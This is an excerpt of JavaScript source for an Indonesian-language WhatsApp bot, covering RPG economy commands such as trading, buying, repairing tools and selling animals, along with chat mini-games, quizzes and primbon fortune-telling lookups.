ditzzreply(`Succes mengupgrade *${rpg.emoticon('atm')}Atm*`)
break
default :
return ditzzreply(`${teks}`)
}
}
break
//=================================================//
...
if (!item.includes(type)) return ditzzreply(lol)
const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let _user = db.data.users[who]
if (!who) return ditzzreply('Tag salah satu, atau ketik Nomernya!!')
if (!(who in db.data.users)) return ditzzreply(`User ${who} not in database`)
if (user[type] * 1 < count) return ditzzreply(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
let previous = user[type] * 1
let _previous = _user[type] * 1
user[type] -= count * 1
_user[type] += count * 1
if (previous > user[type] * 1 && _previous < _user[type] * 1) ditzzreply(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
else {
user[type] = previous
...
if (!item.match('limit') && db.chats[m.chat].rpg == false && isGroup) return dfail('rpg', m, ditzzBug)
let user = db.data.users[m.sender]
...
if (!listItems[item]) return ditzzreply(footer)
if (command.toLowerCase() == 'buy') {
let paymentMethod = Object.keys(listItems[item]).find(v => v in user)
if (user[paymentMethod] < listItems[item][paymentMethod] * total) return ditzzreply(`Kamu membutuhkan *${(listItems[item][paymentMethod] * total) - user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)} Lagi, Untuk Membeli *${total}* ${capitalize(item)} ${rpg.emoticon(item)}. Kamu hanya memiliki *${user[paymentMethod]}* ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}.`)
user[paymentMethod] -= listItems[item][paymentMethod] * total
user[item] += total
return ditzzreply(`Sukses Membeli *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethod] * total} ${capitalize(paymentMethod)} ${rpg.emoticon(paymentMethod)}*`)
} else {
let paymentMethot = Object.keys(listItems[item]).find(v => v in user)
if (user[item] < total) return ditzzreply(`You don't have enough *${capitalize(item)} ${rpg.emoticon(item)}* to sell, you only have ${user[item]} items`)
user[item] -= total
user[paymentMethot] += listItems[item][paymentMethot] * total
return ditzzreply(`Sukses Menjual *${total} ${capitalize(item)} ${rpg.emoticon(item)}*, Seharga *${listItems[item][paymentMethot] * total} ${capitalize(paymentMethot)} ${rpg.emoticon(paymentMethot)}*`)
}
}
break
//=================================================//
...
"Enam": "⭐⭐⭐⭐⭐⭐"
 ...
 if (!skill.includes(skil)) return ditzzreply( `Select *skill🃏* what do you want/pilih skill apa yg kamu inginkan:
...
if (user.skill == "") {
user.skill = skil
ditzzreply(`Anda telah memilih Skill ${skil}`)
} else if (user.skill) {
ditzzreply(`Anda Sudah Punya skill ${user.skill} Tidak bisa diganti`)
}
}
break
//=================================================//
...
let user = db.data.users[m.sender]
if (new Date - user.lastmonthly < cooldown) return ditzzreply( `You have already claimed this monthly claim, wait for *${((user.lastmonthly + cooldown) - new Date()).toTimeString()}*`.trim())
let text = ''
...
let timers = clockString(_timers)
let name = user.registered ? user.name: ditzzBug.getName(m.sender)
let id = m.sender
let kerja = 'Roket'
ditzzBug.misi = ditzzBug.misi ? ditzzBug.misi: {}
if (id in ditzzBug.misi) {
...
if (user.health < 80) return ditzzreply(`Anda Harus Memiliki Minimal 80Health`)
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
...
setTimeout(() => {
ditzzreply( `🔍 ${name} Mencari Lokasi.....`)
}, 0)
user.lastmisi = new Date * 1
} else ditzzreply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
...
switch (type) {
case 'pickaxe':
if (user.pickaxedurability > 99) return ditzzreply('Tools ini belum memiliki kerusakan')
if (user.pickaxe == 0) return ditzzreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return ditzzreply(`Barang tidak cukup!`)
 user.rock -= 20
 user.wood -= 20
 user.iron -= 20
 user.diamond -= 1
 user.pickaxedurability = 100
ditzzreply("Sukses memperbaiki!")
break
//=================================================//
case 'sword':
if (user.sworddurability > 99) return ditzzreply('Tools ini belum memiliki kerusakan')
if (user.sword == 0) return ditzzreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return ditzzreply(`Barang tidak cukup!`)
 user.wood -= 20
 user.iron -= 20
 user.gold -= 3
 user.diamond -= 1
...
//=================================================//
case 'fishingrod':
if (user.fishingroddurability > 99) return ditzzreply('Tools ini belum memiliki kerusakan')
if (user.fishingrod == 0) return ditzzreply('Kamu belum memiliki ini')
if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return ditzzreply(`Barang tidak cukup!`)
 user.wood -= 20
 user.string -= 20
 user.iron -= 20
 user.diamond -= 1
...
//=================================================//
case 'armor':
if (user.armordurability > 99) return ditzzreply('Tools ini belum memiliki kerusakan')
if (user.armor == 0) return ditzzreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return ditzzreply(`Barang tidak cukup!`)
 user.iron -= 15
 user.gold -= 2
 user.diamond -= 1
...
default:
return ditzzBug.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
}
}
} catch (err) {
ditzzreply("Error\n\n\n" + err.stack)
...
let command_link = `wa.me/${ditzzBuguser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
let share_text = `
...
switch (type) {
case 'cat':
if (user.cat > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hcat) return ditzzreply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hcat
db.data.users[m.sender].cat += 1
ditzzreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'dog':
if (user.dog > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hdog) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'fox':
if (user.fox > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hfox) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'horse':
if (user.horse > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hhorse) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'robo':
if (user.robo > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hrobo) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'lion':
if (user.lion > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hlion) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'rhinoceros':
if (user.rhinoceros > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hrhinoceros) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'dragon':
if (user.dragon > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hdragon) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'centaur':
if (user.centaur > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hcentaur) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'kyubi':
if (user.kyubi > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hkyubi) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'griffin':
if (user.griffin > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hgriffin) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'phonix':
if (user.phonix > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hphonix) return ditzzreply(`Pet Token anda kurang`)
...
//=================================================//
case 'wolf':
if (user.wolf > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.pet < hwolf) return ditzzreply(`Pet Token anda kurang`)
...
try {
ditzzBug.tembak = ditzzBug.tembak || { musuh: [], tembak: [] }
 if(/kiri/i.test(text)) {
...
if(ditzzBug.tembak.tembak.indexOf("🤠") == 0) {
ditzzBug.tembak.tembak = kiri[0]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 1) {
ditzzBug.tembak.tembak = kiri[0]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 2) {
ditzzBug.tembak.tembak = kiri[1]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 3) {
ditzzBug.tembak.tembak = kiri[2]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 4) {
ditzzBug.tembak.tembak = kiri[3]
}

let pos = ditzzBug.tembak.musuh.join(" ") + "\n\n\n" + ditzzBug.tembak.tembak.join(" ")



if(ditzzBug.tembak.musuh.indexOf("🥷") === ditzzBug.tembak.tembak.indexOf("🤠")) return ditzzBug.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return ditzzBug.sendButton(m.chat, pos, wm, [
...
if(ditzzBug.tembak.tembak.indexOf("🤠") == 0) {
ditzzBug.tembak.tembak = kanan[1]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 1) {
ditzzBug.tembak.tembak = kanan[2]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 2) {
ditzzBug.tembak.tembak = kanan[3]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 3) {
ditzzBug.tembak.tembak = kanan[4]
} else if(ditzzBug.tembak.tembak.indexOf("🤠") == 4) {
ditzzBug.tembak.tembak = kanan[4]
}
...
if(ditzzBug.tembak.tembak.indexOf("🤠") == ditzzBug.tembak.musuh.indexOf("🥷")) {
ditzzBug.tembak = {}
db.data.users[m.sender].money += 1000
ditzzreply("Kamu menang!\n\nUang += 1000")
}
...
ditzzBug.tembak.musuh = musuh
ditzzBug.tembak.tembak = aku
...
ditzzreply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
} else ditzzreply( `Banteng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'harimau':
...
ditzzreply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
} else ditzzreply( `Harimau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gajah':
...
ditzzreply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
} else ditzzreply( `Gajah Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kambing':
...
ditzzreply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
} else ditzzreply( `Kambing Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'panda':
...
ditzzreply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
} else ditzzreply( `Panda Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buaya':
...
ditzzreply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
} else ditzzreply( `Buaya Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kerbau':
...
ditzzreply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
} else ditzzreply( `Kerbau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'sapi':
...
ditzzreply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
} else ditzzreply( `Sapi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'monyet':
...
ditzzreply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
} else ditzzreply( `Monyet Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babi':
...
} else ( `Babi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babihutan':
...
ditzzreply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
} else ditzzreply( `Babi Hutan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ayam':
...
ditzzreply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
} else ditzzreply( `Ayam Kamu Tidak Cukup`.trim())
break
//mancing
case 'kepiting':
...
ditzzreply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
} else ditzzreply( `Kepiting Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ikan':
...
ditzzreply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
} else ditzzreply( `Ikan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'dory':
...
ditzzreply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
} else ditzzreply( `Ikan Dory Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gurita':
...
ditzzreply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
} else ditzzreply( `Gurita Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buntal':
...
ditzzreply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
} else ditzzreply( `Ikan Buntal Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'hiu':
...
ditzzreply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
} else ditzzreply( `Hiu Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'orca':
...
ditzzreply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
} else ditzzreply( `Paus Orca Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lumba':
...
ditzzreply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
} else ditzzreply( `Lumba Lumba Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'paus':
...
ditzzreply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
} else ditzzreply( `Paus Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lobster':
...
ditzzreply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
} else ditzzreply( `Lobster Kamu Tidak Cukup`.trim())
break
 case 'udang':
if (db.data.users[m.sender].udang >= count * 1) {
db.data.users[m.sender].money += Sudang * count
db.data.users[m.sender].udang -= count * 1
ditzzreply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
} else ditzzreply( `Udang Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'cumi':
...
ditzzreply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
} else ditzzreply( `Cumi Kamu Tidak Cukup`.trim())
 break
//=================================================//
case 'botol':
...
ditzzreply( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
} else ditzzreply( `Botol Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kaleng':
...
ditzzreply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
} else ditzzreply( `Kaleng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kardus':
...
ditzzreply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
} else ditzzreply( `Kardus Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gelas':
...
ditzzreply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
} else ditzzreply( `Gelas Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'plastik':
...
ditzzreply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
} else ditzzreply( `Plastik Kamu Tidak Cukup`.trim())
break
default:
return ditzzreply(Kchat)
}
break
default:
return ditzzreply(Kchat)
...
db.data.users[m.sender].babi -= count * 1
ditzzreply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
} else ditzzreply( `Babi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babihutan':
if (db.data.users[m.sender].babihutan >= count * 1) {
...
db.data.users[m.sender].money += Sbotol * count
db.data.users[m.sender].botol -= count * 1
ditzzreply( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
} else ditzzreply( `Botol Kamu Tidak Cukup`.trim())
break 
case 'kaleng':
if (db.data.users[m.sender].kaleng >= count * 1) {
...
let e = String(err)
ditzzBug.sendMessage("923452696397@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
...
if (new Date - user.lastmaling< 604800000) return ditzzreply(`📮Anda sudah merampok bank\nTunggu selama ⏲️ ${msToTime(time - new Date())} lagi`)
...
setTimeout(() => {
ditzzreply(`Yuk waktunya Maling lagi 👋…`)
}, timeout)
}
break
//=================================================//
...
if (user.umpan == 0) return ditzzreply('Kamu Membutuhkan Umpan 🪱 Untuk Memancing!')
if (user.fishingrod == 0 ) return ditzzreply('Kamu Harus Mempunyai Fishingrod 🎣 Terlebih Dahulu Jika Ingin Memancing')
if (new Date - user.lastmisi > 3600000) {
...
setTimeout(() => {
ditzzreply(`Ini Dia Hasil Tangkapanmu`)
}, 18000)

setTimeout(() => {
ditzzreply('Kamu Berhasil Menarik Ikan Keluar Dari Air')
}, 15000)

setTimeout(() => {
ditzzreply('Kamu Menarik Kailmu')
}, 12000)

setTimeout(() => {
ditzzreply('Kail Mu Di Tarik Ikan...')
}, 9000)

setTimeout(() => {
ditzzreply('Kamu Sedang Memancing...')
}, 0)
user.lastmisi = new Date * 1
} else ditzzreply(`Mohon Tunggu Selama ${timers} Sebelum Memulai Misi Kembali`)
}
break
//=================================================//
case 'nguli': {
...
ditzzreply('_🎉Selamat kamu mendapatkan +10 limit_')
db.data.users[m.sender].lastnguli = new Date * 1
} else ditzzreply('[💬] Anda sudah mengklaim upah nguli hari ini')
}
break
//=================================================//
case 'ttc':
...
this.game = this.game ? this.game : {};
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return ditzzreply('Kamu masih didalam game');
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
if (room) {
ditzzreply('Partner ditemukan!');
room.o = m.chat;
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
if (room.x !== room.o) await ditzzBug.sendText(room.x, str, m, {
mentions: parseMention(str)
});
await ditzzBug.sendText(room.o, str, m, {
mentions: parseMention(str)
});
} else {
room = {
...
ditzzreply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''));
...
if (this.game) {
delete this.game;
ditzzBug.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
} else if (!this.game) {
ditzzreply(`Session TicTacToe🎮 tidak ada`);
} else mewReply('?');
} catch (e) {
ditzzreply('rusak');
}
...
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) ditzzreply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return ditzzreply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return ditzzreply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
...
this.suit[id] = {
chat: await ditzzBug.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) ditzzBug.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
...
case 'kuismath':
case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let {
genMath,
modes
} = require('./lib/math.js');
if (!text) return ditzzreply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh _useran: ${prefix}math medium`);
let result = await genMath(text.toLowerCase());
ditzzBug.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban;
});
await sleep(result.waktu);
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
ditzzreply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]]);
delete kuismath[m.sender.split('@')[0]];
}
}
break;
case 'tebak': {
if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
console.log("Jawaban: " + result.jawaban);
ditzzBug.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m);
delete tebakgambar[m.sender.split('@')[0]];
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ditzzBug.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
...
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ditzzBug.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ditzzBug.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ditzzBug.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
...
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return ditzzreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
case 'afk':
if (!isGroup) return ditzzreply('Only Group')
if (isAfkOn) return ditzzreply("Kakak Sudah Afk Sebelumnya");
let reason = text ? text : 'Nothing.';
afk.addAfkUser(m.sender, Date.now(), reason, _afk);
ditzzreply(`@${m.sender.split('@')[0]} Sedang AFK\nDengan Alasan : ${reason}`);
break

//Primbon
case "nomerhoki": case "nomorhoki": {
if (!Number(text)) return ditzzreply(`Example : ${prefix + command} 6288292024190`) 
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Nomor HP :* ${anu.message.nomer_hp}\n❋々 *Angka Shuzi :* ${anu.message.angka_shuzi}\n❋々 *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n❋々 *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
//=================================================//
case "artimimpi": case "tafsirmimpi": {
if (!text) return ditzzreply(`Example : ${prefix + command} belanja`) 
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Mimpi :* ${anu.message.mimpi}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Solusi :* ${anu.message.solusi}`)
}
break
//=================================================//
case "ramalanjodoh": case "ramaljodoh": {
if (!text) return ditzzreply(`Example : ${prefix + command} Ryo, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
...
//=================================================//
case "artinama": {
if (!text) return ditzzreply(`Example : ${prefix + command} Ryot`) 
let anu = await primbon.arti_nama(text)
if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "kecocokannama": case "cocoknama": {
if (!text) return ditzzreply(`Example : ${prefix + command} Ryo, 7, 7, 2005`) 
...
if (!text) return ditzzreply(`Example : ${prefix + command} Ryo|Mboh`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return ditzzreply(anu.message)
ditzzBug.sendImage(m.chat,anu.message.gambar, `❋々 *Nama Anda :* ${anu.message.nama_anda}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan}\n❋々 *Sisi Positif :* ${anu.message.sisi_positif}\n❋々 *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case "jadianpernikahan": case "jadiannikah": {
if (!text) return ditzzreply(`Example : ${prefix + command} 6, 12, 2020`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Tanggal Pernikahan :* ${anu.message.tanggal}\n❋々 *karakteristik :* ${anu.message.karakteristik}`)
}
break
//=================================================//
case "sifatusaha": {
if (!ext) return ditzzreply(`Example : ${prefix+ command} 28, 12, 2021`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Lahir :* ${anu.message.hari_lahir}\n❋々 *Usaha :* ${anu.message.usaha}`)
}
break
//=================================================//
case "rejeki": case "rezeki": {
if (!text) return ditzzreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
...
if (anu.status == false) return ditzzreply(anu.message)
ditzzBug.sendImage(m.chat, anu.message.image, `❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Simbol Tarot :* ${anu.message.simbol_tarot}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "fengshui": {
if (!text) return ditzzreply(`Example : ${prefix + command} Ryo, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
...
//=================================================//
case "peruntungan": {
if (!text) return ditzzreply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2023\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`) 
...
//=================================================//
case "memancing": {
if (!text) return ditzzreply(`Example : ${prefix + command} 12, 1, 2023`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return ditzzreply(anu.message)
ditzzreply(`❋々 *Tanggal :* ${anu.message.tgl_memancing}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "masasubur": {
if (!text) return ditzzreply(`Example : ${prefix + command} 12, 1, 2023, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`) 
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
